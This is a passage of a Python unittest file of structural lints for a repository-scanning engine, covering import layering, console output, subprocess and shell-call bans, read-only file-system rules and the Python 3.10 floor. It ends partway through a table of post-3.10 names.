"""Lints of the repository (WP-12, docs/python_engine_design.md sections 3.2 and 11): the structural rules of the Python engine, checked
on the source text of ``scan_pipeline.py`` and ``transit/`` and on this directory, so that a rule that is broken fails the suite and not a
review. Plain unittest, standard library only:

    python3 -I -m unittest discover -s tests/engine -p "test_lints.py"

HOW THIS FILE IS BUILT. Every lint is a pure function ``lint_<name>(sources)`` of a mapping ``repository-relative path -> source text`` that
returns a list of problems (empty = clean). The tests call it twice: on the real tree (``test_real_tree_*``) and on tiny synthetic trees
that BREAK the rule (``test_flags_*``, which prove the lint can fail, one per forbidden construct) and on near misses that must not trip it
(``test_near_miss_*``, which keep it from becoming noise). A lint that has never been seen red proves nothing.

THE LINTS (each one is a class below):
  * layering and imports (3.2 as amended: ``transit/scanners/__init__.py`` is the one module under ``scanners/`` and ``rules/`` that may
    import ``verdict`` and ``console``; review log R-11): no import cycle, the barred imports, the leaf modules, ``dispatch`` imports no
    scanner, ``layers`` is imported by ``pipeline`` only and ``pipeline`` by ``scan_pipeline.py`` only;
  * ``import re`` only in ``transit/rx.py`` (and in the helper programs); ``files`` and ``findings`` use no regex, glob or fnmatch at all
    (repository text);
  * ``print(`` and writes to ``sys.stdout`` / ``sys.stderr`` only in ``transit/console.py`` and ``scan_pipeline.py``;
  * ``subprocess`` imported only by ``transit/tools/__init__.py``; no ``shell=True``, ``os.system``, ``os.popen``, ``eval``, ``exec``;
  * none of the seven helper PROGRAMS is imported (``import transit.containers.pdf`` raises ``SystemExit(0)``: a silent exit with status 0);
  * no ``rx.after_context`` / ``rx.lines_over`` / whole-buffer ``.split(b"\\n")`` / ``.splitlines(`` in ``files``, ``rules``, ``universal``,
    ``credentials`` (memory, F12);
  * no module-level mutable state in a scanner module (the bash ``PS_FAILED`` global must become a local);
  * no regex compiled or registered inside a function (design 9: an ad-hoc pattern would be invisible to ``rx.registered()``, the
    hostile-line test and the fuzz gate);
  * S14, the scanned directory is read-only: no module outside ``files``, ``report``, ``pipeline``, ``layers`` and ``tools`` calls an
    API that writes (an approximation, stated below);
  * Python 3.10 is the floor: the files parse as 3.10, use no 3.11+ name, and no 3.12 f-string form;
  * every file compiles with warnings as errors and every engine module imports with no output, no warning, no signal change and none
    of the helper programs (F6, F10), under every Python 3.10 to 3.14 found on the host;
  * no contiguous credential token and no PEM private key in ``tests/engine`` (the pipeline run over its own repository would flag the
    suite, and a secret scanner on the remote may refuse the push);
  * every message of a rule table occurs in ``scan_pipeline.sh``, every registered pattern occurs in ``tests/conformance/patterns.json``;
  * ``scan_pipeline.py`` and ``transit/`` are in the Docker image, the offline bundle and the integrity manifest, and CI runs the engine tests.

A token-shaped credential is never written contiguously in this file: the positive cases of the token lint are assembled from two halves.
"""
from __future__ import annotations

import ast
import contextlib
import dataclasses
import functools
import io
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import tokenize
import unittest
from pathlib import Path
from typing import Iterator, Mapping, Sequence
from unittest import mock

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT))

# ═══════════════════════════════════════════════════════════════════════════════════════════════
# the tree
# ═══════════════════════════════════════════════════════════════════════════════════════════════
#: The seven files that are PROGRAMS, not modules (design 3.3): importing one reads ``sys.argv`` or exits. No engine module may import them.
HELPER_PROGRAMS = frozenset({
    "transit/containers/office.py", "transit/containers/jar.py", "transit/containers/pdf.py",
    "transit/scanners/manifests.py", "transit/tools/gitleaks.py", "transit/tools/scancode.py", "transit/report_json.py",
})
HELPER_MODULES = frozenset(p[:-3].replace("/", ".") for p in HELPER_PROGRAMS)
#: The only modules that may write to the console.
CONSOLE_WRITERS = frozenset({"transit/console.py", "scan_pipeline.py"})
#: The module that may import ``subprocess``.
SUBPROCESS_OWNER = "transit/tools/__init__.py"
#: Modules that may write files (S14): the work directory, the temporary area, the reports, the sidecars, the tool wrappers' scratch.
#: A module outside this set that needs to write is an amendment (design 1.3), not an exemption.
WRITERS = frozenset({"transit/files.py", "transit/report.py", "transit/pipeline.py", "transit/layers.py"})
#: Interpreter versions the engine must run on; the host has some of them, CI has all.
FLOOR = (3, 10)


def module_name(rel: str) -> str:
    """``transit/rules/__init__.py`` -> ``transit.rules``; ``scan_pipeline.py`` -> ``scan_pipeline``."""
    parts = rel[:-3].split("/")
    if parts[-1] == "__init__":
        parts = parts[:-1]
    return ".".join(parts)


def is_engine(rel: str) -> bool:
    """A file that is part of the engine: ``scan_pipeline.py`` and ``transit/**/*.py`` except the seven helper programs."""
    return (rel == "scan_pipeline.py" or (rel.startswith("transit/") and rel.endswith(".py"))) and rel not in HELPER_PROGRAMS


def is_scanner_module(rel: str) -> bool:
    return rel.startswith("transit/scanners/") and rel.endswith(".py") and rel not in HELPER_PROGRAMS


def is_rules_module(rel: str) -> bool:
    return rel == "transit/rules/__init__.py" or (rel.startswith("transit/rules/") and rel.endswith(".py"))


def load_sources(root: Path = ROOT) -> "dict[str, str]":
    """Every ``.py`` file of the engine (``scan_pipeline.py``, ``transit/**``, the helper programs included), keyed by its
    repository-relative POSIX path. Reads bytes and decodes UTF-8 (a file that is not UTF-8 is a problem the floor lint reports)."""
    found: "dict[str, str]" = {}
    entry = root / "scan_pipeline.py"
    if entry.is_file():
        found["scan_pipeline.py"] = entry.read_bytes().decode("utf-8", "replace")
    base = root / "transit"
    for path in sorted(base.rglob("*.py")) if base.is_dir() else []:
        if "__pycache__" in path.parts:
            continue
        found[path.relative_to(root).as_posix()] = path.read_bytes().decode("utf-8", "replace")
    return found


def load_test_sources(root: Path = ROOT) -> "dict[str, str]":
    """The test files that must also run on the floor interpreter and hold no token: ``tests/engine/*.py`` and ``family_diff.py``."""
    found: "dict[str, str]" = {}
    for path in sorted((root / "tests" / "engine").glob("*.py")):
        found[path.relative_to(root).as_posix()] = path.read_bytes().decode("utf-8", "replace")
    extra = root / "tests" / "conformance" / "family_diff.py"
    if extra.is_file():
        found[extra.relative_to(root).as_posix()] = extra.read_bytes().decode("utf-8", "replace")
    return found


#: The modules of the first wave, present (empty) in every synthetic tree so that ``from transit import verdict`` resolves to a module.
BASE_MODULES = ("config", "console", "cli", "findings", "verdict", "files", "dispatch", "layers", "report", "pipeline", "rx")


def tree_of(**files: str) -> "dict[str, str]":
    """A synthetic tree for a test: the package files, the first-wave modules and the seven helper programs, all empty, plus ``files``
    (``tree_of(**{"transit/scanners/shell.py": "import re\\n"})``; a given path replaces the empty one)."""
    base: "dict[str, str]" = {"transit/__init__.py": "", "transit/scanners/__init__.py": "", "transit/containers/__init__.py": "",
                              "transit/tools/__init__.py": "", "transit/rules/__init__.py": ""}
    for name in BASE_MODULES:
        base["transit/%s.py" % name] = ""
    for helper in HELPER_PROGRAMS:
        base[helper] = ""
    base.update(files)
    return base


def parse_all(sources: "Mapping[str, str]") -> "dict[str, ast.Module]":
    """The AST of every file that parses (a file that does not is the floor lint's problem, not another lint's)."""
    trees: "dict[str, ast.Module]" = {}
    for rel, text in sources.items():
        try:
            trees[rel] = ast.parse(text, filename=rel)
        except (SyntaxError, ValueError):
            continue
    return trees

# ═══════════════════════════════════════════════════════════════════════════════════════════════
# the lints (pure functions of source text; each returns a list of problems, empty when clean)
# ═══════════════════════════════════════════════════════════════════════════════════════════════
# <<CHECKERS
@functools.lru_cache(maxsize=None)
def _parse(rel: str, text: str) -> "ast.Module | None":
    """The AST of one file, or None when it does not parse (``lint_floor`` is the lint that says so)."""
    try:
        return ast.parse(text, filename=rel)
    except (SyntaxError, ValueError, RecursionError):
        return None


def _engine_trees(sources: "Mapping[str, str]") -> "Iterator[tuple[str, ast.Module]]":
    for rel in sorted(sources):
        if is_engine(rel):
            tree = _parse(rel, sources[rel])
            if tree is not None:
                yield rel, tree


def _known_modules(sources: "Mapping[str, str]") -> "frozenset[str]":
    return frozenset(module_name(rel) for rel in sources if rel.endswith(".py"))


def _package_of(rel: str) -> "list[str]":
    """The package a relative import is resolved against: the module itself for an ``__init__``, else its parent."""
    parts = module_name(rel).split(".")
    return parts if rel.endswith("/__init__.py") else parts[:-1]


def _from_base(rel: str, node: ast.ImportFrom) -> "str | None":
    """The dotted module a ``from X import ...`` names, relative imports resolved; None when the dots climb out of the package."""
    if not node.level:
        return node.module or ""
    package = _package_of(rel)
    keep = len(package) - (node.level - 1)
    if keep < 0:
        return None
    return ".".join(package[:keep] + (node.module.split(".") if node.module else []))


def _bindings(rel: str, tree: ast.Module) -> "dict[str, str]":
    """Local name -> qualified name, for every import in the file (a function-level import included)."""
    bound: "dict[str, str]" = {}
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for alias in node.names:
                if alias.asname:
                    bound[alias.asname] = alias.name
                else:
                    root = alias.name.split(".")[0]
                    bound[root] = root
        elif isinstance(node, ast.ImportFrom):
            base = _from_base(rel, node)
            if base is None:
                continue
            for alias in node.names:
                if alias.name != "*":
                    bound[alias.asname or alias.name] = base + "." + alias.name if base else alias.name
    return bound


def _qualify(node: ast.AST, bound: "Mapping[str, str]") -> "str | None":
    """``rx.after_context`` -> ``transit.rx.after_context`` through the file's imports; a builtin keeps its name; None for anything that
    is not a plain name or attribute chain (``data.split`` on a call result, a subscript ...)."""
    parts: "list[str]" = []
    while isinstance(node, ast.Attribute):
        parts.append(node.attr)
        node = node.value
    if not isinstance(node, ast.Name):
        return None
    return ".".join([bound.get(node.id, node.id)] + parts[::-1])


def _import_refs(rel: str, tree: ast.Module, known: "frozenset[str]", bound: "Mapping[str, str]") -> "list[tuple[str, int]]":
    """``(dotted module, line)`` for every import: ``import a.b``, ``from a.b import c`` (``a.b``, and ``a.b.c`` when that is a module of the
    tree), relative imports resolved, and ``importlib.import_module("a.b")`` / ``__import__("a.b")`` with a constant name."""
    refs: "list[tuple[str, int]]" = []
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            refs.extend((alias.name, node.lineno) for alias in node.names)
        elif isinstance(node, ast.ImportFrom):
            base = _from_base(rel, node)
            if base is None:
                continue
            if base:
                refs.append((base, node.lineno))
            for alias in node.names:
                candidate = base + "." + alias.name if base else alias.name
                if alias.name != "*" and candidate in known:
                    refs.append((candidate, node.lineno))
        elif isinstance(node, ast.Call) and node.args and isinstance(node.args[0], ast.Constant) and isinstance(node.args[0].value, str):
            if _qualify(node.func, bound) in ("importlib.import_module", "__import__"):
                refs.append((node.args[0].value, node.lineno))
    return refs


def _module_of(name: str, known: "frozenset[str]") -> "str | None":
    """The longest prefix of a dotted name that is a module of the tree (``transit.rules.Match`` -> ``transit.rules``)."""
    parts = name.split(".")
    for count in range(len(parts), 0, -1):
        candidate = ".".join(parts[:count])
        if candidate in known:
            return candidate
    return None


def _is_name(name: str, wanted: str) -> bool:
    return name == wanted or name.startswith(wanted + ".")


def _walk_scoped(tree: ast.AST) -> "Iterator[tuple[ast.AST, bool]]":
    """Every node with a flag: is it inside a function or lambda body?"""
    stack: "list[tuple[ast.AST, bool]]" = [(tree, False)]
    while stack:
        node, in_function = stack.pop()
        yield node, in_function
        inner = in_function or isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef, ast.Lambda))
        stack.extend((child, inner) for child in ast.iter_child_nodes(node))


def _problem(rel: str, node: "ast.AST | int", text: str) -> str:
    line = node if isinstance(node, int) else getattr(node, "lineno", 0)
    return "%s:%d: %s" % (rel, line, text)


def lint_import_cycles(sources: "Mapping[str, str]") -> "list[str]":
    """The explicit import graph of the engine (and the implicit edge from a module to its parent package) has no cycle."""
    known = _known_modules(sources)
    engine = frozenset(module_name(rel) for rel in sources if is_engine(rel))
    graph: "dict[str, set[str]]" = {name: set() for name in engine}
    for rel, tree in _engine_trees(sources):
        me = module_name(rel)
        bound = _bindings(rel, tree)
        for name, _line in _import_refs(rel, tree, known, bound):
            target = _module_of(name, engine)
            if target is not None and target != me:
                graph[me].add(target)
        parent = me.rpartition(".")[0]
        if parent in engine and parent != me:
            graph[me].add(parent)          # importing a.b.c runs a/b/__init__.py first
    problems: "list[str]" = []
    state: "dict[str, int]" = {}
    reported: "set[frozenset[str]]" = set()

    def visit(start: str) -> None:
        stack: "list[tuple[str, Iterator[str]]]" = [(start, iter(sorted(graph[start])))]
        path = [start]
        state[start] = 1
        while stack:
            node, children = stack[-1]
            for child in children:
                if state.get(child) == 1:
                    cycle = path[path.index(child):] + [child]
                    key = frozenset(cycle)
                    if key not in reported:
                        reported.add(key)
                        problems.append("import cycle: " + " -> ".join(cycle))
                elif child not in state:
                    state[child] = 1
                    path.append(child)
                    stack.append((child, iter(sorted(graph[child]))))
                    break
            else:
                state[node] = 2
                path.pop()
                stack.pop()

    for name in sorted(graph):
        if name not in state:
            visit(name)
    return problems


#: Design 3.1 and 3.2: modules that import nothing from the engine.
LEAF_MODULES = frozenset({"transit.config", "transit.console", "transit.cli", "transit.findings"})
#: The frozen diagram of 3.2 for the modules whose imports it fixes (the standard library is free). ``rx`` is a leaf everybody may use.
ALLOWED_IMPORTS: "Mapping[str, frozenset[str]]" = {
    "transit.verdict": frozenset({"transit.console", "transit.findings"}),
    "transit.rules": frozenset({"transit.rx"}),
    "transit.files": frozenset({"transit.config", "transit.findings", "transit.rules", "transit.rx"}),
    "transit.tools": frozenset({"transit.config", "transit.console"}),
    "transit.dispatch": frozenset({"transit.files"}),
    "transit.report": frozenset({"transit.cli", "transit.config", "transit.console", "transit.files", "transit.findings", "transit.verdict"}),
    "transit.scanners": frozenset({"transit.config", "transit.console", "transit.files", "transit.rules", "transit.rx", "transit.tools",
                                   "transit.verdict"}),
}


def lint_layering(sources: "Mapping[str, str]") -> "list[str]":
    """3.2 as amended, plus the leaf and ``dispatch`` rules of 3.1."""
    known = _known_modules(sources)
    problems: "list[str]" = []
    for rel, tree in _engine_trees(sources):
        me = module_name(rel)
        bound = _bindings(rel, tree)
        under_scanners_or_rules = is_scanner_module(rel) or is_rules_module(rel)
        for name, line in sorted(set(_import_refs(rel, tree, known, bound)), key=lambda item: (item[1], item[0])):
            target = _module_of(name, known)
            if target is None or not (target == "transit" or target.startswith("transit.")) or target == me or target == "transit":
                continue
            if under_scanners_or_rules and rel != "transit/scanners/__init__.py" and target in ("transit.verdict", "transit.console"):
                problems.append(_problem(rel, line, "imports %s; only transit/scanners/__init__.py under scanners/ and rules/ may (design 3.2, R-11)" % target))
            if under_scanners_or_rules and target in ("transit.layers", "transit.pipeline", "transit.report"):
                problems.append(_problem(rel, line, "imports %s; nothing under scanners/ or rules/ may (design 3.2)" % target))
            elif target == "transit.layers" and me != "transit.pipeline":
                problems.append(_problem(rel, line, "imports transit.layers; only transit.pipeline may (design 3.2)"))
            elif target == "transit.pipeline" and me != "scan_pipeline":
                problems.append(_problem(rel, line, "imports transit.pipeline; only scan_pipeline.py may (design 3.2)"))
            if me in LEAF_MODULES:
                problems.append(_problem(rel, line, "is a leaf module and must not import %s (design 3.1)" % target))
            allowed = ALLOWED_IMPORTS.get(me)
            if allowed is not None and target not in allowed and target not in ("transit.layers", "transit.pipeline", "transit.report") \
                    and not (under_scanners_or_rules and target in ("transit.verdict", "transit.console") and rel != "transit/scanners/__init__.py"):
                problems.append(_problem(rel, line, "imports %s; the layering of design 3.2 allows %s only %s"
                                         % (target, me, ", ".join(sorted(allowed)))))
    return problems


def lint_regex_imports(sources: "Mapping[str, str]") -> "list[str]":
    """``import re`` only in ``transit/rx.py``; ``files.py`` and ``findings.py`` import no ``re``, ``fnmatch``, ``glob``."""
    known = _known_modules(sources)
    problems: "list[str]" = []
    for rel, tree in _engine_trees(sources):
        bound = _bindings(rel, tree)
        banned = ["re", "regex"] if rel != "transit/rx.py" else []
        if rel in ("transit/files.py", "transit/findings.py"):
            banned += ["fnmatch", "glob"]
        for name, line in _import_refs(rel, tree, known, bound):
            if any(_is_name(name, word) for word in banned):
                problems.append(_problem(rel, line, "imports %s; regular expressions are compiled by transit/rx.py alone%s" % (
                    name, " (this module reads repository text)" if rel in ("transit/files.py", "transit/findings.py") else "")))
    return problems


_CONSOLE_STREAMS = frozenset({"sys.stdout", "sys.stderr", "sys.__stdout__", "sys.__stderr__"})
_CONSOLE_CALLS = frozenset({"traceback.print_exc", "traceback.print_exception", "traceback.print_stack", "traceback.print_tb",
                            "traceback.print_last", "warnings.warn", "warnings.warn_explicit", "warnings.showwarning"})


def lint_console_output(sources: "Mapping[str, str]") -> "list[str]":
    """``print``, ``sys.stdout``, ``sys.stderr``, ``traceback.print_*``, ``logging``, ``warnings.warn`` only in console.py and scan_pipeline.py."""
    known = _known_modules(sources)
    problems: "list[str]" = []
    for rel, tree in _engine_trees(sources):
        if rel in CONSOLE_WRITERS:
            continue
        bound = _bindings(rel, tree)
        seen: "set[tuple[int, str]]" = set()

        def report(node: "ast.AST | int", what: str) -> None:
            line = node if isinstance(node, int) else getattr(node, "lineno", 0)
            if (line, what) not in seen:
                seen.add((line, what))
                problems.append(_problem(rel, line, "%s; only transit/console.py writes to the console (S1)" % what))

        for name, line in _import_refs(rel, tree, known, bound):
            if _is_name(name, "logging"):
                report(line, "imports logging")
        for node in ast.walk(tree):
            if isinstance(node, ast.Name) and node.id == "print" and isinstance(node.ctx, ast.Load) and "print" not in bound:
                report(node, "uses print")
            elif isinstance(node, (ast.Attribute, ast.Name)):
                qualified = _qualify(node, bound)
                if qualified in _CONSOLE_STREAMS:
                    report(node, "uses " + qualified)
            if isinstance(node, ast.Call):
                qualified = _qualify(node.func, bound)
                if qualified in _CONSOLE_CALLS:
                    report(node, "calls " + qualified)
                elif qualified == "os.write" and node.args and isinstance(node.args[0], ast.Constant) and node.args[0].value in (1, 2):
                    report(node, "calls os.write on fd %d" % node.args[0].value)
    return problems


_PROCESS_STARTERS = frozenset("os." + name for name in (
    "fork", "forkpty", "execl", "execle", "execlp", "execlpe", "execv", "execve", "execvp", "execvpe",
    "spawnl", "spawnle", "spawnlp", "spawnlpe", "spawnv", "spawnve", "spawnvp", "spawnvpe", "posix_spawn", "posix_spawnp"))


def lint_subprocess(sources: "Mapping[str, str]") -> "list[str]":
    """``subprocess`` imported only by ``transit/tools/__init__.py``; no ``os.fork``/``exec*``/``spawn*`` anywhere."""
    known = _known_modules(sources)
    problems: "list[str]" = []
    for rel, tree in _engine_trees(sources):
        bound = _bindings(rel, tree)
        for name, line in _import_refs(rel, tree, known, bound):
            if _is_name(name, "subprocess") and rel != SUBPROCESS_OWNER:
                problems.append(_problem(rel, line, "imports subprocess; only %s may (S6)" % SUBPROCESS_OWNER))
            elif _is_name(name, "multiprocessing") or _is_name(name, "pty"):
                problems.append(_problem(rel, line, "imports %s; the engine starts a process only through tools.run_process" % name))
        for node in ast.walk(tree):
            if isinstance(node, ast.Call) and _qualify(node.func, bound) in _PROCESS_STARTERS:
                problems.append(_problem(rel, node, "calls %s; the engine starts a process only through tools.run_process" % _qualify(node.func, bound)))
    return problems


_SHELL_CALLS = frozenset({"os.system", "os.popen", "subprocess.getoutput", "subprocess.getstatusoutput", "commands.getoutput",
                          "commands.getstatusoutput"})


def lint_dangerous_calls(sources: "Mapping[str, str]") -> "list[str]":
    """No ``shell=True`` (or a ``shell=`` that is not the constant False), ``os.system``, ``os.popen``, ``eval``, ``exec``."""
    problems: "list[str]" = []
    for rel, tree in _engine_trees(sources):
        bound = _bindings(rel, tree)
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            qualified = _qualify(node.func, bound)
            if qualified in ("eval", "exec") or qualified in _SHELL_CALLS:
                problems.append(_problem(rel, node, "calls %s; repository text must never reach a shell or an interpreter (S6)" % qualified))
            for keyword in node.keywords:
                if keyword.arg == "shell" and not (isinstance(keyword.value, ast.Constant) and keyword.value.value is False):
                    problems.append(_problem(rel, node, "passes shell=<not False>; a process is started from an argument list (S6)"))
    return problems


def lint_helper_imports(sources: "Mapping[str, str]") -> "list[str]":
    """No engine file imports one of the seven helper programs, by ``import``, ``from``, a relative import or ``import_module``."""
    known = _known_modules(sources)
    problems: "list[str]" = []
    for rel, tree in _engine_trees(sources):
        bound = _bindings(rel, tree)
        for name, line in _import_refs(rel, tree, known, bound):
            if any(_is_name(name, helper) for helper in HELPER_MODULES):
                problems.append(_problem(rel, line, "imports the helper PROGRAM %s; it reads sys.argv or exits when imported "
                                                    "(transit.containers.pdf raises SystemExit(0)); run it with tools.run_helper_script" % name))
    return problems


_BUFFER_SCOPE = frozenset({"transit/files.py", "transit/scanners/universal.py", "transit/scanners/credentials.py"})
_BUFFER_FORBIDDEN = frozenset({"transit.rx.after_context", "transit.rx.lines_over"})


def lint_buffer_splitting(sources: "Mapping[str, str]") -> "list[str]":
    """In files, rules, universal, credentials: no ``rx.after_context``, ``rx.lines_over``, ``.split(b"\\n")``, ``.splitlines(``."""
    problems: "list[str]" = []
    for rel, tree in _engine_trees(sources):
        if rel not in _BUFFER_SCOPE and not is_rules_module(rel):
            continue
        bound = _bindings(rel, tree)
        for node in ast.walk(tree):
            if isinstance(node, (ast.Attribute, ast.Name)) and _qualify(node, bound) in _BUFFER_FORBIDDEN:
                problems.append(_problem(rel, node, "uses %s, which splits the buffer into a list of lines (about 19 times its size, F12)"
                                         % _qualify(node, bound)))
            if isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute):
                attr = node.func.attr
                if attr in ("splitlines", "readlines"):
                    problems.append(_problem(rel, node, "calls .%s(), which materialises every line of a buffer (memory, F12)" % attr))
                elif attr in ("split", "rsplit") and len(node.args) == 1 and not node.keywords \
                        and isinstance(node.args[0], ast.Constant) and node.args[0].value in (b"\n", "\n"):
                    problems.append(_problem(rel, node, "splits a whole buffer on a newline (memory, F12)"))
    return problems


_MUTABLE_CONSTRUCTORS = frozenset({
    "list", "dict", "set", "bytearray", "collections.deque", "collections.defaultdict", "collections.OrderedDict", "collections.Counter",
    "collections.ChainMap", "weakref.WeakValueDictionary", "weakref.WeakKeyDictionary", "weakref.WeakSet", "queue.Queue",
    "queue.SimpleQueue", "io.StringIO", "io.BytesIO", "array.array"})
_MEMOISING = frozenset({"functools.lru_cache", "functools.cache", "functools.cached_property"})


#: An annotation that says "this is read only": a literal annotated with one of these is a constant table (``KNOWN_SCANNERS: Mapping[str, str] = {...}``).
_READ_ONLY_ANNOTATIONS = frozenset({"Mapping", "Sequence", "Collection", "AbstractSet", "Iterable", "Container", "Final"})


def _read_only_annotation(annotation: "ast.AST | None") -> bool:
    node = annotation
    if isinstance(node, ast.Constant) and isinstance(node.value, str):          # a string annotation: ``"Mapping[str, str]"``
        try:
            node = ast.parse(node.value, mode="eval").body
        except SyntaxError:
            return False
    if isinstance(node, ast.Subscript):
        node = node.value
    name = node.attr if isinstance(node, ast.Attribute) else node.id if isinstance(node, ast.Name) else ""
    return name in _READ_ONLY_ANNOTATIONS


def _is_mutable(value: ast.AST, bound: "Mapping[str, str]") -> bool:
    if isinstance(value, (ast.List, ast.Dict, ast.Set, ast.ListComp, ast.DictComp, ast.SetComp)):
        return True
    if isinstance(value, ast.Call):
        return _qualify(value.func, bound) in _MUTABLE_CONSTRUCTORS
    if isinstance(value, ast.Tuple):
        return any(_is_mutable(item, bound) for item in value.elts)
    return False


def _top_level_statements(body: "Sequence[ast.stmt]") -> "Iterator[ast.stmt]":
    """The statements that run when the module is imported: the body, and what is inside an ``if``, ``try``, ``with``, ``for``, ``while``."""
    for statement in body:
        yield statement
        for field in ("body", "orelse", "finalbody"):
            inner = getattr(statement, field, None)
            if inner and not isinstance(statement, (ast.FunctionDef, ast.AsyncFunctionDef, ast.ClassDef)):
                yield from _top_level_statements(inner)
        for handler in getattr(statement, "handlers", ()):
            yield from _top_level_statements(handler.body)


def lint_module_state(sources: "Mapping[str, str]") -> "list[str]":
    """No module-level mutable state in a scanner module: mutable literals and constructors, ``global``, memoising decorators."""
    problems: "list[str]" = []
    for rel, tree in _engine_trees(sources):
        if not is_scanner_module(rel):
            continue
        bound = _bindings(rel, tree)

        def check_assignment(statement: ast.stmt, where: str) -> None:
            read_only = False
            if isinstance(statement, ast.Assign):
                names = [t.id for t in statement.targets if isinstance(t, ast.Name)]
                value: "ast.AST | None" = statement.value
            elif isinstance(statement, (ast.AnnAssign, ast.AugAssign)):
                names = [statement.target.id] if isinstance(statement.target, ast.Name) else []
                value = statement.value
                read_only = isinstance(statement, ast.AnnAssign) and _read_only_annotation(statement.annotation)
            else:
                return
            if value is not None and not read_only and _is_mutable(value, bound) \
                    and not (names and all(n in ("__all__", "__slots__") for n in names)):
                problems.append(_problem(rel, statement, "%s %s is mutable state shared by every file (the bash PS_FAILED global must be a local)"
                                         % (where, ", ".join(names) or "an assignment")))

        for statement in _top_level_statements(tree.body):
            check_assignment(statement, "module-level")
            if isinstance(statement, ast.ClassDef):
                for member in _top_level_statements(statement.body):
                    check_assignment(member, "class attribute")
        for node in ast.walk(tree):
            if isinstance(node, ast.Global):
                problems.append(_problem(rel, node, "declares global %s; module state is forbidden in a scanner" % ", ".join(node.names)))
            elif isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
                for decorator in node.decorator_list:
                    target = decorator.func if isinstance(decorator, ast.Call) else decorator
                    if _qualify(target, bound) in _MEMOISING:
                        problems.append(_problem(rel, node, "%s is memoised: a cache is module state shared by every file" % node.name))
    return problems


_PATTERN_COMPILERS = frozenset({"transit.rx.ere_to_py", "transit.rx.ere_to_py_source", "transit.rx.rule", "transit.rx.parse_ere",
                                "transit.rules.Match", "transit.rules.Matcher", "transit.rules.RuleSet"})


def lint_regex_in_function(sources: "Mapping[str, str]") -> "list[str]":
    """No ``Match(``, ``Matcher(``, ``RuleSet(``, ``rx.ere_to_py``, ``rx.rule`` inside a function outside rx.py and rules/__init__.py."""
    problems: "list[str]" = []
    for rel, tree in _engine_trees(sources):
        if rel == "transit/rx.py" or rel == "transit/rules/__init__.py":
            continue
        bound = _bindings(rel, tree)
        for node, in_function in _walk_scoped(tree):
            if in_function and isinstance(node, ast.Call) and _qualify(node.func, bound) in _PATTERN_COMPILERS:
                problems.append(_problem(rel, node, "calls %s inside a function; a pattern is built at import as a RuleSet row or a Matcher so that "
                                                    "rx.registered(), the hostile-line test and the fuzz gate see it (design 9)" % _qualify(node.func, bound)))
    return problems


_OS_WRITERS = frozenset("os." + name for name in (
    "remove", "unlink", "rename", "renames", "replace", "rmdir", "removedirs", "mkdir", "makedirs", "mkfifo", "mknod", "chmod", "chown",
    "lchown", "fchmod", "fchown", "chflags", "link", "symlink", "truncate", "ftruncate", "utime", "sendfile", "copy_file_range", "setxattr",
    "removexattr", "lchmod"))
_SHUTIL_WRITERS = frozenset("shutil." + name for name in (
    "copy", "copy2", "copyfile", "copyfileobj", "copymode", "copystat", "copytree", "move", "rmtree", "chown", "make_archive", "unpack_archive"))
_TEMPFILE_WRITERS = frozenset("tempfile." + name for name in (
    "mkstemp", "mkdtemp", "NamedTemporaryFile", "TemporaryFile", "TemporaryDirectory", "SpooledTemporaryFile"))
_PATH_WRITERS = frozenset({"write_text", "write_bytes", "touch", "symlink_to", "hardlink_to", "mkdir", "unlink", "rmdir", "rename", "truncate",
                           "chmod", "lchmod"})
_WRITE_FLAGS = frozenset({"O_WRONLY", "O_RDWR", "O_CREAT", "O_TRUNC", "O_APPEND", "O_EXCL", "O_TMPFILE"})


def _open_writes(call: ast.Call) -> bool:
    """``open(path, mode)``: True when the mode may write, or cannot be read from the source."""
    mode: "ast.AST | None" = call.args[1] if len(call.args) > 1 else None
    for keyword in call.keywords:
        if keyword.arg == "mode":
            mode = keyword.value
    if mode is None:
        return False
    if isinstance(mode, ast.Constant) and isinstance(mode.value, str):
        return any(letter in mode.value for letter in "wax+")
    return True


def _os_open_writes(call: ast.Call) -> bool:
    flags: "ast.AST | None" = call.args[1] if len(call.args) > 1 else None
    for keyword in call.keywords:
        if keyword.arg == "flags":
            flags = keyword.value
    if flags is None:
        return True
    names = {n.attr if isinstance(n, ast.Attribute) else n.id for n in ast.walk(flags) if isinstance(n, (ast.Attribute, ast.Name))}
    if names & _WRITE_FLAGS:
        return True
    return not any(name.startswith("O_") for name in names)


def _opens_devnull(call: ast.Call, bound: "Mapping[str, str]") -> bool:
    """``os.open(os.devnull, ...)``: the console points a closed stream at ``/dev/null``; that is no write to the scanned directory."""
    if not call.args:
        return False
    target = call.args[0]
    return _qualify(target, bound) == "os.devnull" or (isinstance(target, ast.Constant) and target.value == "/dev/null")


def lint_writes(sources: "Mapping[str, str]") -> "list[str]":
    """S14: no call that writes to the file system in a module outside ``WRITERS`` and ``transit/tools/``."""
    problems: "list[str]" = []
    for rel, tree in _engine_trees(sources):
        if rel in WRITERS or rel.startswith("transit/tools/"):
            continue
        bound = _bindings(rel, tree)
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            qualified = _qualify(node.func, bound)
            what = None
            if qualified in ("open", "io.open", "codecs.open", "builtins.open", "os.open") and _opens_devnull(node, bound):
                continue
            if qualified in ("open", "io.open", "codecs.open", "builtins.open") and _open_writes(node):
                what = "opens a file for writing (or with a mode that cannot be read)"
            elif qualified == "os.open" and _os_open_writes(node):
                what = "calls os.open with flags that may write"
            elif qualified in _OS_WRITERS or qualified in _SHUTIL_WRITERS or qualified in _TEMPFILE_WRITERS:
                what = "calls %s" % qualified
            elif isinstance(node.func, ast.Attribute) and node.func.attr in _PATH_WRITERS and qualified not in _OS_WRITERS:
                what = "calls .%s()" % node.func.attr
            if what:
                problems.append(_problem(rel, node, "%s; the scanned directory is read-only and only files, report, pipeline, layers and tools write (S14)" % what))
    return problems


_NEWER_THAN_THE_FLOOR = {
    "tomllib": "tomllib is 3.11", "typing.Self": "typing.Self is 3.11", "typing.LiteralString": "typing.LiteralString is 3.11",
    "typing.Never": "typing.Never is 3.11", "typing.assert_never": "typing.assert_never is 3.11", "typing.assert_type": "typing.assert_type is 3.11",
